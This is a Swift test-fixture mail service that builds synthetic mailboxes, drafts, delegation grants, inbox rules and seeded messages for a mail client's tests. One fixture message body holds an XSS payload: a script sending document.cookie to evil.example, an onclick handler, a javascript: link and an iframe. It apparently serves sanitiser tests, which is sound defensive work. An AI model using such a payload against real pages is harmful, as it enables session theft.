import Foundation
import CalendarCore

/// Synthetic, deterministic mailboxes (contoso.example / fabrikam.example, invented names — no real data).
/// Three mailboxes: "me", a shared mailbox (Send As granted) and a delegate principal (Send on Behalf granted).
/// Mutable in memory so apply/saveDraft/send/rules/OOF really change state; delta returns everything on the first
/// round and only changes afterwards.
public final class FixtureMailService: MailService, @unchecked Sendable {
    public static let me = EmailAddress(name: "You", address: "you@contoso.example")
    public static let sharedMailbox = "support@contoso.example"
    public static let principal = "sam.rivera@contoso.example"
    public static let mailboxes = ["me", sharedMailbox, principal]
    /// Ids of hand-placed messages that tests rely on.
    public enum Special {
        public static let tracker = "msg-tracker", script = "msg-script", highlyConfidential = "msg-hc",
                          confidential = "msg-conf", general = "msg-general", orphanLabel = "msg-orphan",
                          privateMsg = "msg-private", flagged = "msg-flagged", attachments = "msg-attach",
                          newsletter = "msg-news", notification = "msg-notify", sharedInbox = "msg-shared-1",
                          principalInbox = "msg-sam-1", thread = "conv-t1",
                          viewOnly = "msg-rights-view", copyPrint = "msg-rights-copy", doNotForward = "msg-rights-dnf"
    }
    public static let labelGeneral = FixtureCalendarService.labels[1].id
    public static let labelConfidential = FixtureCalendarService.labels[2].id
    public static let labelHighlyConfidential = FixtureCalendarService.labels[3].id
    public static let labelViewOnly = FixtureCalendarService.labelViewOnly
    public static let labelCopyPrint = FixtureCalendarService.labelCopyPrint
    public static let labelDoNotForward = FixtureCalendarService.labelDoNotForward

    private struct Rec { var m: MailMessage; var mailbox: String; var ver: Int64; var body: String? }
    private let lock = NSLock()
    private var recs: [String: Rec] = [:]
    private var folderList: [String: MailFolder] = [:]
    private var tombstones: [(folder: String, id: String, ver: Int64)] = []
    private var seq: Int64 = 0
    private var nextId = 0
    /// COMPOSE2: quoted history per reply/forward draft (like Graph's createReply shell).
    private var draftCarry: [String: DraftCarry] = [:]
    private var ruleSets: [String: [MailRule]] = [:]
    private var oof: [String: AutomaticReplies] = [:]
    private let grants: [String: SendMode] = [sharedMailbox: .sendAs, principal: .sendOnBehalf]
    private var _offline = false
    private var _sent: [(id: String, mailbox: String, sendAt: Date?)] = []
    private var rng: UInt64
    public let now: Date

    public var simulateOffline: Bool {
        get { lock.withLock { _offline } }
        set { lock.withLock { _offline = newValue } }
    }
    /// (draftId, mailbox, sendAt) per successful send() — for tests.
    public var sentLog: [(id: String, mailbox: String, sendAt: Date?)] { lock.withLock { _sent } }
    public var messageCount: Int { lock.withLock { recs.count } }
    /// Server-side view of one message (tests: verify what actually reached the "server").
    public func serverMessage(_ id: String) -> MailMessage? { lock.withLock { recs[id].map { var m = $0.m; m.body = $0.body; return m } } }

    public init(now: Date = Date(), seed: UInt64 = 0x5EED) {
        self.now = now
        self.rng = seed
        build()
    }

    // MARK: Folder ids

    public static func folderId(_ mailbox: String, _ w: WellKnownFolder) -> String { "\(key(mailbox))-\(w.rawValue)" }
    public static let projectsFolderId = "me-projects"
    static func key(_ mailbox: String) -> String {
        mailbox == "me" ? "me" : mailbox == sharedMailbox ? "support" : mailbox == principal ? "sam" : mailbox
    }

    // MARK: MailService

    public func me() async throws -> EmailAddress { try gate(); return Self.me }

    public func folders(mailbox: String) async throws -> [MailFolder] {
        try gate()
        return lock.withLock {
            folderList.values.filter { $0.mailbox == mailbox }.map { f in
                var f = f
                let inF = recs.values.filter { $0.m.folderId == f.id }
                f.totalCount = inF.count; f.unreadCount = inF.filter { !$0.m.isRead }.count
                return f
            }.sorted { $0.id < $1.id }
        }
    }

    public func delta(folder: MailFolder, deltaLink: String?, top: Int, since: Date?) async throws -> MailDelta {
        try gate()
        return lock.withLock {
            let prefix = "fixture:\(folder.id):"
            if let deltaLink, deltaLink.hasPrefix(prefix), let from = Int64(deltaLink.dropFirst(prefix.count)) {
                let ups = recs.values.filter { $0.m.folderId == folder.id && $0.ver > from }.map { header($0.m) }
                let rem = tombstones.filter { $0.folder == folder.id && $0.ver > from }.map(\.id)
                    .filter { recs[$0]?.m.folderId != folder.id }
                return MailDelta(upserts: ups, removedIds: rem, deltaLink: prefix + String(seq))
            }
            let ups = recs.values.filter { $0.m.folderId == folder.id && (since == nil || $0.m.received >= since!) }
                .sorted { $0.m.received > $1.m.received }.map { header($0.m) }
            return MailDelta(upserts: ups, removedIds: [], deltaLink: prefix + String(seq))
        }
    }

    public func page(folder: MailFolder, before: MailCursor?, top: Int) async throws -> [MailMessage] {
        try gate()
        return lock.withLock {
            recs.values.map(\.m).filter { m in
                guard m.folderId == folder.id else { return false }
                guard let b = before else { return true }
                return m.received < b.received || (m.received == b.received && m.id < b.id)
            }.sorted { ($0.received, $0.id) > ($1.received, $1.id) }.prefix(top).map(header)
        }
    }

    public func message(id: String, mailbox: String) async throws -> MailMessage {
        try gate()
        return try lock.withLock {
            guard let r = recs[id] else { throw MailServiceError.notFound }
            var m = r.m; m.body = r.body; return m
        }
    }

    public func apply(_ action: MailAction, messageId: String, mailbox: String) async throws -> MailMessage? {
        try gate()
        return try lock.withLock {
            guard var r = recs[messageId] else { throw MailServiceError.notFound }
            let oldFolder = r.m.folderId
            switch action {
            case .markRead(let b): r.m.isRead = b
            case .flag(let f): r.m.flag = f
            case .categorize(let c): r.m.categories = c
            case .move(let to):
                guard folderList[to] != nil else { throw MailServiceError.notFound }
                r.m.folderId = to
            case .delete: r.m.folderId = Self.folderId(r.mailbox, .deleteditems)
            case .snooze: r.m.folderId = ensureSnoozed(r.mailbox)
            case .unsnooze: r.m.folderId = Self.folderId(r.mailbox, .inbox)
            }
            seq += 1; r.ver = seq
            if r.m.folderId != oldFolder { tombstones.append((oldFolder, messageId, seq)) }
            recs[messageId] = r
            return header(r.m)
        }
    }

    public func saveDraft(_ draft: MailDraft, mailbox: String) async throws -> MailMessage {
        try gate()
        return try lock.withLock {
            var from = Self.me, sender: EmailAddress? = nil
            if let id = draft.from, id.mode != .selfSend {
                guard grants[id.address.lowercased()] == id.mode else { throw MailServiceError.sendAsDenied(id.address) }
                if id.mode == .sendAs, mailbox != id.mailbox { throw MailServiceError.sendAsDenied(id.address) }
                from = id.emailAddress
                sender = id.mode == .sendOnBehalf ? Self.me : id.emailAddress
            } else if mailbox != "me" {
                from = EmailAddress(name: "", address: mailbox)
            }
            // PATCH in place (COMPOSE2): same id, header + body replaced, quoted history kept.
            if let eid = draft.existingId, var r = recs[eid], r.m.isDraft, r.mailbox == mailbox {
                // A reopened draft (kind .new) already carries its history in bodyHTML: wrap only replies/forwards.
                let body = draft.kind == .new ? draft.bodyHTML : (draftCarry[eid].map { $0.wrap(draft.bodyHTML) } ?? draft.bodyHTML)
                r.m.toRecipients = draft.to; r.m.ccRecipients = draft.cc; r.m.importance = draft.importance
                if !draft.subject.isEmpty || draft.kind == .new { r.m.subject = draft.subject }
                r.m.labelId = draft.labelId ?? r.m.labelId
                r.m.from = from; r.m.sender = sender
                r.m.preview = Self.plain(body)
                r.m.attachments = draft.attachments.map { Self.info($0) }
                r.m.hasAttachments = !r.m.attachments.isEmpty
                r.body = body
                seq += 1; r.ver = seq
                recs[eid] = r
                var out = r.m; out.body = body
                return out
            }
            nextId += 1
            var to = draft.to, cc = draft.cc, subject = draft.subject, body = draft.bodyHTML
            var conv = "conv-draft-\(nextId)"
            if draft.kind != .new {
                guard let oid = draft.replyTo, let o = recs[oid] else { throw MailServiceError.notFound }
                // Graph createReply on /users/{mailbox}/messages/{id}: the original must live in that mailbox.
                guard o.mailbox == mailbox else { throw MailServiceError.notFound }
                conv = o.m.conversationId
                let prefix = draft.kind == .forward ? "FW: " : "RE: "
                if subject.isEmpty { subject = prefix + o.m.subject }
                switch draft.kind {
                case .reply: if to.isEmpty { to = o.m.from.map { [$0] } ?? [] }
                case .replyAll:
                    if to.isEmpty {
                        let mine = Set([Self.me.address, mailbox].map { $0.lowercased() })
                        to = (o.m.from.map { [$0] } ?? []) + o.m.toRecipients.filter { !mine.contains($0.address.lowercased()) }
                        cc = cc.isEmpty ? o.m.ccRecipients.filter { !mine.contains($0.address.lowercased()) } : cc
                    }
                default: break
                }
                var carry = DraftCarry(prefix: "", suffix: "<hr><div id=\"divRplyFwdMsg\">" + (o.body ?? "") + "</div>")
                if draft.omitHistory == true { carry = carry.withoutHistory }
                draftCarry["draft-\(nextId)"] = carry
                body = carry.wrap(draft.bodyHTML)
            }
            let id = "draft-\(nextId)"
            var m = MailMessage(id: id, folderId: Self.folderId(mailbox, .drafts), conversationId: conv, subject: subject,
                                from: from, toRecipients: to, ccRecipients: cc, received: Date(), preview: Self.plain(body),
                                bodyIsHTML: true, isRead: true, isDraft: true, importance: draft.importance,
                                labelId: draft.labelId, changeKey: "ck-1", sender: sender)
            m.attachments = draft.attachments.map { Self.info($0) }
            m.hasAttachments = !m.attachments.isEmpty
            seq += 1
            recs[id] = Rec(m: m, mailbox: mailbox, ver: seq, body: body)
            var out = m; out.body = body
            return out
        }
    }

    static func info(_ a: OutgoingAttachment) -> AttachmentInfo {
        AttachmentInfo(id: "att-\(a.id.uuidString.prefix(8))", name: a.name, contentType: a.contentType, size: a.size, isInline: a.isInline)
    }

    public func addAttachment(_ a: OutgoingAttachment, toDraft draftId: String, mailbox: String) async throws -> AttachmentInfo {
        try gate()
        if let why = AttachmentUpload.invalidReason(size: a.size, name: a.name) { throw MailServiceError.http(413, why) }
        return try lock.withLock {
            guard var r = recs[draftId], r.m.isDraft, r.mailbox == mailbox else { throw MailServiceError.notFound }
            let i = Self.info(a)
            r.m.attachments.append(i); r.m.hasAttachments = true
            seq += 1; r.ver = seq
            recs[draftId] = r
            AttachmentProgress.shared.report(a.id, sent: a.size, total: a.size)
            return i
        }
    }

    public func send(draftId: String, mailbox: String, sendAt: Date?) async throws {
        try gate()
        try lock.withLock {
            guard var r = recs[draftId], r.m.isDraft else { throw MailServiceError.notFound }
            guard r.mailbox == mailbox else { throw MailServiceError.notFound }
            let old = r.m.folderId
            r.m.isDraft = false
            r.m.sent = Date(); r.m.received = Date()
            r.m.scheduledSend = sendAt
            r.m.folderId = Self.folderId(mailbox, .sentitems)
            seq += 1; r.ver = seq
            tombstones.append((old, draftId, seq))
            recs[draftId] = r
            _sent.append((draftId, mailbox, sendAt))
        }
    }

    public func search(_ query: String, mailbox: String, top: Int) async throws -> [MailMessage] {
        try gate()
        let q = query.lowercased()
        return lock.withLock {
            recs.values.filter { r in
                r.mailbox == mailbox && (r.m.subject.lowercased().contains(q) || (r.m.preview?.lowercased().contains(q) ?? false)
                    || (r.m.from?.address.lowercased().contains(q) ?? false) || (r.m.from?.name.lowercased().contains(q) ?? false))
            }.map(\.m).sorted { $0.received > $1.received }.prefix(top).map(header)
        }
    }

    // MARK: Rules

    public func rules(mailbox: String) async throws -> [MailRule] {
        try gate()
        return lock.withLock { (ruleSets[mailbox] ?? []).sorted { $0.sequence < $1.sequence } }
    }

    public func saveRule(_ rule: MailRule, mailbox: String) async throws -> MailRule {
        try gate()
        return try lock.withLock {
            var list = ruleSets[mailbox] ?? []
            var r = rule
            if let id = r.id {
                guard let i = list.firstIndex(where: { $0.id == id }) else { throw MailServiceError.notFound }
                if list[i].isReadOnly { throw MailServiceError.forbidden }
                list[i] = r
            } else {
                nextId += 1; r.id = "rule-\(nextId)"; list.append(r)
            }
            ruleSets[mailbox] = list
            return r
        }
    }

    public func deleteRule(id: String, mailbox: String) async throws {
        try gate()
        try lock.withLock {
            guard let i = ruleSets[mailbox]?.firstIndex(where: { $0.id == id }) else { throw MailServiceError.notFound }
            ruleSets[mailbox]!.remove(at: i)
        }
    }

    // MARK: Automatic replies

    public func automaticReplies(mailbox: String) async throws -> AutomaticReplies {
        try gate()
        return lock.withLock { oof[mailbox] ?? AutomaticReplies() }
    }

    public func setAutomaticReplies(_ replies: AutomaticReplies, mailbox: String) async throws -> AutomaticReplies {
        try gate()
        // Mirrors Graph: delegated MailboxSettings.ReadWrite covers only the signed-in user's own mailbox.
        guard mailbox == "me" else { throw MailServiceError.forbidden }
        return lock.withLock { oof[mailbox] = replies; return replies }
    }

    public func regionalSettings(mailbox: String) async throws -> MailboxRegionalSettings {
        try gate()
        return MailboxRegionalSettings(timeZone: "W. Europe Standard Time",
                                       workingHours: WorkingHours(daysOfWeek: ["monday", "tuesday", "wednesday", "thursday", "friday"],
                                                                  startTime: "08:30:00.0000000", endTime: "17:00:00.0000000",
                                                                  timeZone: "W. Europe Standard Time"),
                                       dateFormat: "dd.MM.yyyy", timeFormat: "HH:mm", locale: "de-CH")   // A11Y-HOOK
    }

    // MARK: Folder management

    private func mutable(_ id: String, _ mailbox: String) throws -> MailFolder {
        guard let f = folderList[id], f.mailbox == mailbox else { throw MailServiceError.notFound }
        if f.isProtected { throw MailFolderError.protected }
        return f
    }

    private func nameFree(_ name: String, parent: String?, mailbox: String, except: String? = nil) throws {
        if folderList.values.contains(where: { $0.mailbox == mailbox && $0.parentId == parent && $0.id != except
                                               && $0.displayName.caseInsensitiveCompare(name) == .orderedSame }) {
            throw MailFolderError.nameTaken
        }
    }

    public func createFolder(displayName: String, parentId: String?, mailbox: String) async throws -> MailFolder {
        try gate()
        guard let name = FolderTree.cleanName(displayName) else { throw MailFolderError.invalidName }
        return try lock.withLock {
            if let parentId, folderList[parentId]?.mailbox != mailbox { throw MailServiceError.notFound }
            try nameFree(name, parent: parentId, mailbox: mailbox)
            nextId += 1
            let f = MailFolder(id: "\(Self.key(mailbox))-folder-\(nextId)", displayName: name, parentId: parentId, mailbox: mailbox)
            folderList[f.id] = f
            return f
        }
    }

    public func renameFolder(id: String, displayName: String, mailbox: String) async throws -> MailFolder {
        try gate()
        guard let name = FolderTree.cleanName(displayName) else { throw MailFolderError.invalidName }
        return try lock.withLock {
            var f = try mutable(id, mailbox)
            try nameFree(name, parent: f.parentId, mailbox: mailbox, except: id)
            f.displayName = name; folderList[id] = f
            return f
        }
    }

    public func moveFolder(id: String, toParentId: String?, mailbox: String) async throws -> MailFolder {
        try gate()
        return try lock.withLock {
            var f = try mutable(id, mailbox)
            let all = folderList.values.filter { $0.mailbox == mailbox }
            if let to = toParentId {
                guard let dest = folderList[to] else { throw MailServiceError.notFound }
                guard dest.mailbox == mailbox, to != id, !FolderTree.descendants(of: id, in: all).contains(to) else {
                    throw MailFolderError.invalidDestination
                }
            }
            try nameFree(f.displayName, parent: toParentId, mailbox: mailbox, except: id)
            f.parentId = toParentId; folderList[id] = f
            return f
        }
    }

    public func deleteFolder(id: String, mailbox: String) async throws {
        try gate()
        try lock.withLock {
            var f = try mutable(id, mailbox)
            let trash = Self.folderId(mailbox, .deleteditems)
            let all = folderList.values.filter { $0.mailbox == mailbox }
            if FolderTree.descendants(of: trash, in: all).contains(id) {
                for d in FolderTree.descendants(of: id, in: all).union([id]) {
                    folderList[d] = nil
                    for (mid, r) in recs where r.m.folderId == d { recs[mid] = nil; seq += 1; tombstones.append((d, mid, seq)) }
                }
            } else {
                f.parentId = trash; folderList[id] = f     // whole sub-tree moves with it
            }
        }
    }

    public func markAllRead(folderId: String, mailbox: String) async throws -> Int {
        try gate()
        return lock.withLock {
            var n = 0
            for (id, var r) in recs where r.m.folderId == folderId && !r.m.isRead {
                r.m.isRead = true; seq += 1; r.ver = seq; recs[id] = r; n += 1
            }
            return n
        }
    }

    public func emptyFolder(folderId: String, mailbox: String) async throws -> Int {
        try gate()
        return lock.withLock {
            let all = folderList.values.filter { $0.mailbox == mailbox }
            let scope = FolderTree.descendants(of: folderId, in: all).union([folderId])
            var n = 0
            for (id, r) in recs where scope.contains(r.m.folderId) {
                if r.m.folderId == folderId { n += 1 }
                recs[id] = nil; seq += 1; tombstones.append((r.m.folderId, id, seq))
            }
            for d in scope where d != folderId { folderList[d] = nil }
            return n
        }
    }

    // MARK: Internals

    private func gate() throws { if simulateOffline { throw MailServiceError.offline } }

    /// What delta/page/list return: headers only (bodies come from `message(id:)`).
    private func header(_ m: MailMessage) -> MailMessage { var m = m; m.body = nil; return m }

    private func ensureSnoozed(_ mailbox: String) -> String {
        let id = Self.folderId(mailbox, .snoozed)
        if folderList[id] == nil {
            folderList[id] = MailFolder(id: id, displayName: "Snoozed", parentId: nil, wellKnown: .snoozed, mailbox: mailbox)
        }
        return id
    }

    static func plain(_ html: String) -> String {
        let stripped = html.replacingOccurrences(of: "<[^>]+>", with: " ", options: .regularExpression)
            .replacingOccurrences(of: "\\s+", with: " ", options: .regularExpression)
            .trimmingCharacters(in: .whitespaces)
        return String(stripped.prefix(140))
    }

    private func rand(_ n: Int) -> Int {
        rng &+= 0x9E3779B97F4A7C15
        var z = rng
        z = (z ^ (z >> 30)) &* 0xBF58476D1CE4E5B9
        z = (z ^ (z >> 27)) &* 0x94D049BB133111EB
        return Int((z ^ (z >> 31)) % UInt64(max(n, 1)))
    }

    // MARK: Fixture data

    static let people: [EmailAddress] = [
        .init(name: "Alex Morgan", address: "alex@contoso.example"),
        .init(name: "Jordan Lee", address: "jordan@fabrikam.example"),
        .init(name: "Priya Natarajan", address: "priya@fabrikam.example"),
        .init(name: "Chris Okafor", address: "chris@contoso.example"),
        .init(name: "Mia Keller", address: "mia@fabrikam.example"),
        .init(name: "Lukas Brunner", address: "lukas@contoso.example"),
        .init(name: "Elena Rossi", address: "elena@fabrikam.example"),
    ]
    static let newsletters: [EmailAddress] = [
        .init(name: "Northwind Weekly", address: "newsletter@news.northwind.example"),
        .init(name: "Adatum Digest", address: "digest@updates.adatum.example"),
        .init(name: "Tailspin News", address: "news@tailspin.example"),
    ]
    static let notifiers: [EmailAddress] = [
        .init(name: "Fabrikam DevOps", address: "notifications@devops.fabrikam.example"),
        .init(name: "Ticket Desk", address: "no-reply@tickets.example"),
        .init(name: "Status Page", address: "alerts@status.example"),
    ]
    static let topics = ["Quarterly planning", "Migration timeline", "Budget review", "Workshop agenda", "Contract renewal",
                         "Network refresh", "Onboarding checklist", "Licence true-up", "Backup report", "Pilot feedback",
                         "Roadmap draft", "Invoice question", "Travel request", "Security baseline", "Team offsite"]
    static let newsTopics = ["This week in cloud", "Five tips for hybrid teams", "Product update", "Webinar invitation", "Monthly digest"]
    static let notifyTopics = ["Build succeeded", "Pipeline failed", "Ticket updated", "Incident resolved", "Scheduled maintenance"]

    private func add(_ m: MailMessage, mailbox: String = "me", body: String) {
        var m = m
        if m.preview == nil { m.preview = Self.plain(body) }
        seq += 1
        recs[m.id] = Rec(m: m, mailbox: mailbox, ver: seq, body: body)
    }

    private func ago(_ minutes: Int) -> Date { now.addingTimeInterval(-Double(minutes) * 60) }

    private func build() {
        for mb in Self.mailboxes {
            let wk: [WellKnownFolder] = mb == "me" ? [.inbox, .archive, .sentitems, .drafts, .deleteditems, .junkemail, .outbox]
                                                   : [.inbox, .sentitems, .drafts, .deleteditems]
            let names: [WellKnownFolder: String] = [.inbox: "Inbox", .archive: "Archive", .sentitems: "Sent Items", .drafts: "Drafts",
                                                    .deleteditems: "Deleted Items", .junkemail: "Junk Email", .outbox: "Outbox"]
            for w in wk {
                let id = Self.folderId(mb, w)
                folderList[id] = MailFolder(id: id, displayName: names[w]!, wellKnown: w, mailbox: mb)
            }
        }
        folderList[Self.projectsFolderId] = MailFolder(id: Self.projectsFolderId, displayName: "Projects",
                                                       parentId: Self.folderId("me", .inbox), mailbox: "me")
        let inbox = Self.folderId("me", .inbox), sent = Self.folderId("me", .sentitems), archive = Self.folderId("me", .archive)
        let three = 21 * 24 * 60

        // Threads: 5 conversations of 3–5 messages alternating them/me.
        for t in 1...5 {
            let other = Self.people[t % Self.people.count]
            let n = 3 + (t % 3)
            let start = rand(three - 2000) + 1500
            for k in 0..<n {
                let mine = k % 2 == 1
                let subj = (k == 0 ? "" : "RE: ") + Self.topics[t]
                add(MailMessage(id: "msg-t\(t)-\(k + 1)", folderId: mine ? sent : inbox, conversationId: "conv-t\(t)",
                                subject: subj, from: mine ? Self.me : other, toRecipients: [mine ? other : Self.me],
                                received: ago(start - k * 180), isRead: mine || k < n - 2, focus: .focused),
                    body: "<p>Thread \(t) message \(k + 1). Notes on \(Self.topics[t].lowercased()).</p>")
            }
        }
        // Inbox singles from people (focused, some other).
        for i in 0..<35 {
            let p = Self.people[rand(Self.people.count)]
            let topic = Self.topics[rand(Self.topics.count)]
            add(MailMessage(id: "msg-in-\(i)", folderId: inbox, conversationId: "conv-in-\(i)", subject: topic, from: p,
                            toRecipients: [Self.me], ccRecipients: i % 4 == 0 ? [Self.people[(i + 1) % Self.people.count]] : [],
                            received: ago(rand(three)), isRead: rand(3) > 0, importance: i % 9 == 0 ? .high : .normal,
                            focus: i % 6 == 5 ? .other : .focused, labelId: i % 7 == 0 ? Self.labelGeneral : nil),
                body: "<p>Hi, a short note about \(topic.lowercased()). Item \(i).</p>")
        }
        // Newsletters + notifications (Other).
        for i in 0..<15 {
            let s = Self.newsletters[i % Self.newsletters.count]
            add(MailMessage(id: i == 0 ? Special.newsletter : "msg-news-\(i)", folderId: inbox, conversationId: "conv-news-\(i)",
                            subject: Self.newsTopics[i % Self.newsTopics.count], from: s, toRecipients: [Self.me],
                            received: ago(rand(three)), isRead: rand(2) == 0, focus: .other,
                            categories: i % 5 == 0 ? ["Newsletter"] : []),
                body: "<p>Newsletter issue \(i).</p>")
        }
        for i in 0..<20 {
            let s = Self.notifiers[i % Self.notifiers.count]
            add(MailMessage(id: i == 0 ? Special.notification : "msg-notify-\(i)", folderId: inbox, conversationId: "conv-notify-\(i)",
                            subject: Self.notifyTopics[i % Self.notifyTopics.count] + " #\(100 + i)", from: s, toRecipients: [Self.me],
                            received: ago(rand(three)), isRead: rand(2) == 0, focus: i % 4 == 0 ? .focused : .other),
                body: "<p>Automated notification \(i).</p>")
        }
        // Archive (recent) + Sent + Projects.
        for i in 0..<15 {
            let p = Self.people[i % Self.people.count]
            add(MailMessage(id: "msg-arch-\(i)", folderId: archive, conversationId: "conv-arch-\(i)", subject: Self.topics[i % Self.topics.count],
                            from: p, toRecipients: [Self.me], received: ago(rand(three)), isRead: true), body: "<p>Archived \(i).</p>")
        }
        // Old archive history (120–670 days) for window / backfill tests.
        for i in 0..<12 {
            add(MailMessage(id: "msg-old-\(i)", folderId: archive, conversationId: "conv-old-\(i)", subject: "Old " + Self.topics[i],
                            from: Self.people[i % Self.people.count], toRecipients: [Self.me],
                            received: ago((120 + i * 50) * 24 * 60), isRead: true), body: "<p>Old \(i).</p>")
        }
        for i in 0..<10 {
            let p = Self.people[(i + 2) % Self.people.count]
            add(MailMessage(id: "msg-sent-\(i)", folderId: sent, conversationId: "conv-sent-\(i)", subject: Self.topics[(i + 3) % Self.topics.count],
                            from: Self.me, toRecipients: [p], received: ago(rand(three)), sent: ago(rand(three)), isRead: true),
                body: "<p>Sent \(i).</p>")
        }
        for i in 0..<8 {
            add(MailMessage(id: "msg-proj-\(i)", folderId: Self.projectsFolderId, conversationId: "conv-proj-\(i)",
                            subject: "Project update \(i + 1)", from: Self.people[i % Self.people.count], toRecipients: [Self.me],
                            received: ago(rand(three)), isRead: i > 2), body: "<p>Project \(i).</p>")
        }
        for i in 0..<2 {
            add(MailMessage(id: "msg-draft-\(i)", folderId: Self.folderId("me", .drafts), conversationId: "conv-d-\(i)",
                            subject: "Draft \(i + 1)", from: Self.me, toRecipients: [Self.people[i]], received: ago(60 * (i + 1)),
                            isRead: true, isDraft: true), body: "<p>Unfinished.</p>")
        }

        // Hand-placed specials.
        add(MailMessage(id: Special.tracker, folderId: inbox, conversationId: "conv-s1", subject: "Event invitation", from: Self.people[1],
                        toRecipients: [Self.me], received: ago(30), bodyIsHTML: true, focus: .focused),
            body: "<p>Join us.</p><img src=\"https://tracker.example/p.gif\" width=\"1\" height=\"1\"><img src=\"cid:logo\">")
        add(MailMessage(id: Special.script, folderId: inbox, conversationId: "conv-s2", subject: "Formatted update", from: Self.people[2],
                        toRecipients: [Self.me], received: ago(45), bodyIsHTML: true),
            body: "<p onclick=\"steal()\">Hello</p><script>document.location='https://evil.example/'+document.cookie</script><a href=\"javascript:alert(1)\">x</a><iframe src=\"https://evil.example\"></iframe>")
        add(MailMessage(id: Special.highlyConfidential, folderId: inbox, conversationId: "conv-s3", subject: "Board pack", from: Self.people[0],
                        toRecipients: [Self.me], ccRecipients: [Self.people[3]], received: ago(90), bodyIsHTML: true,
                        hasAttachments: true, attachments: [.init(id: "att-hc", name: "pack.pdf", contentType: "application/pdf", size: 220_000)],
                        labelId: Self.labelHighlyConfidential),
            body: "<p>Encrypted content placeholder.</p>")
        add(MailMessage(id: Special.confidential, folderId: inbox, conversationId: "conv-s4", subject: "Pricing proposal", from: Self.people[4],
                        toRecipients: [Self.me], received: ago(120), bodyIsHTML: true, labelId: Self.labelConfidential),
            body: "<p>Confidential pricing details.</p>")
        add(MailMessage(id: Special.general, folderId: inbox, conversationId: "conv-s5", subject: "Lunch and learn", from: Self.people[5],
                        toRecipients: [Self.me], received: ago(150), bodyIsHTML: true, labelId: Self.labelGeneral),
            body: "<p>General announcement.</p>")
        add(MailMessage(id: Special.orphanLabel, folderId: inbox, conversationId: "conv-s6", subject: "Partner memo", from: Self.people[6],
                        toRecipients: [Self.me], received: ago(180), bodyIsHTML: true, labelId: FixtureCalendarService.orphanLabelId),
            body: "<p>Label unknown to policy.</p>")
        // Usage-rights demo: one message per encrypted label with known rights.
        add(MailMessage(id: Special.viewOnly, folderId: inbox, conversationId: "conv-r1", subject: "Audit findings (view only)", from: Self.people[0],
                        toRecipients: [Self.me], received: ago(185), bodyIsHTML: true, labelId: Self.labelViewOnly),
            body: "<p>Encrypted content placeholder.</p>")
        add(MailMessage(id: Special.copyPrint, folderId: inbox, conversationId: "conv-r2", subject: "Partner workshop notes", from: Self.people[4],
                        toRecipients: [Self.me], received: ago(190), bodyIsHTML: true, labelId: Self.labelCopyPrint),
            body: "<p>Encrypted content placeholder.</p>")
        add(MailMessage(id: Special.doNotForward, folderId: inbox, conversationId: "conv-r3", subject: "Reorg briefing — do not forward", from: Self.people[2],
                        toRecipients: [Self.me], received: ago(195), bodyIsHTML: true, labelId: Self.labelDoNotForward),
            body: "<p>Encrypted content placeholder.</p>")
        add(MailMessage(id: Special.privateMsg, folderId: inbox, conversationId: "conv-s7", subject: "Personal matter", from: Self.people[3],
                        toRecipients: [Self.me], received: ago(200), isPrivate: true), body: "<p>Private note.</p>")
        add(MailMessage(id: Special.flagged, folderId: inbox, conversationId: "conv-s8", subject: "Please review by Friday", from: Self.people[0],
                        toRecipients: [Self.me], received: ago(240), flag: .init(status: .flagged, due: now.addingTimeInterval(3 * 86400))),
            body: "<p>Review needed.</p>")
        add(MailMessage(id: Special.attachments, folderId: inbox, conversationId: "conv-s9", subject: "Spreadsheet attached", from: Self.people[1],
                        toRecipients: [Self.me], received: ago(260), hasAttachments: true,
                        attachments: [.init(id: "att-1", name: "figures.xlsx", contentType: "application/vnd.ms-excel", size: 48_000),
                                      .init(id: "att-2", name: "logo.png", contentType: "image/png", size: 4_000, isInline: true)]),
            body: "<p>See attached.</p>")
        for i in 0..<3 {
            add(MailMessage(id: "msg-flag-\(i)", folderId: inbox, conversationId: "conv-f\(i)", subject: "Follow-up \(i + 1)",
                            from: Self.people[i + 2], toRecipients: [Self.me], received: ago(300 + i * 60), isRead: true,
                            flag: .init(status: .flagged, due: now.addingTimeInterval(Double(i + 1) * 86400))),
                body: "<p>Follow up \(i).</p>")
        }

        // Shared mailbox + delegate principal.
        for i in 0..<6 {
            add(MailMessage(id: i == 0 ? Special.sharedInbox : "msg-shared-\(i + 1)", folderId: Self.folderId(Self.sharedMailbox, .inbox),
                            conversationId: "conv-sh-\(i)", subject: "Support request \(i + 1)", from: Self.people[(i + 3) % Self.people.count],
                            toRecipients: [.init(name: "Support", address: Self.sharedMailbox)], received: ago(rand(three))),
                mailbox: Self.sharedMailbox, body: "<p>Customer question \(i).</p>")
        }
        for i in 0..<5 {
            add(MailMessage(id: i == 0 ? Special.principalInbox : "msg-sam-\(i + 1)", folderId: Self.folderId(Self.principal, .inbox),
                            conversationId: "conv-sam-\(i)", subject: "Exec briefing \(i + 1)", from: Self.people[i % Self.people.count],
                            toRecipients: [.init(name: "Sam Rivera", address: Self.principal)], received: ago(rand(three)),
                            labelId: i == 1 ? Self.labelConfidential : nil, isPrivate: i == 2),
                mailbox: Self.principal, body: "<p>Briefing \(i).</p>")
        }

        // Rules (own mailbox): one external forward (policy warns), one disabled, one in error.
        ruleSets["me"] = [
            MailRule(id: "rule-a", displayName: "Newsletters to Archive", sequence: 1,
                     conditions: RuleConditions(senderContains: ["newsletter"]), actions: RuleActions(moveToFolder: archive, markAsRead: true)),
            MailRule(id: "rule-b", displayName: "Forward invoices to bookkeeper", sequence: 2,
                     conditions: RuleConditions(subjectContains: ["invoice"]),
                     actions: RuleActions(forwardTo: [.init(name: "Bookkeeper", address: "books@external-accounting.example")])),
            MailRule(id: "rule-c", displayName: "Flag high importance", sequence: 3, isEnabled: false,
                     conditions: RuleConditions(importance: .high), actions: RuleActions(assignCategories: ["Urgent"])),
            MailRule(id: "rule-d", displayName: "Old project folder", sequence: 4,
                     conditions: RuleConditions(subjectContains: ["project"]), actions: RuleActions(moveToFolder: "folder-gone"), hasError: true),
        ]
        oof["me"] = AutomaticReplies(status: .disabled)
        oof[Self.principal] = AutomaticReplies(status: .scheduled, start: now.addingTimeInterval(86400), end: now.addingTimeInterval(5 * 86400),
                                                timeZone: "W. Europe Standard Time", internalReplyHTML: "<p>Away this week.</p>",
                                                externalReplyHTML: "<p>Out of office.</p>", externalAudience: .contactsOnly)
        nextId = 1000
    }
}

extension FixtureMailService: DraftHistoryProviding {
    public func draftHistory(id: String) -> String? { lock.withLock { draftCarry[id] }?.historyDocument }
}
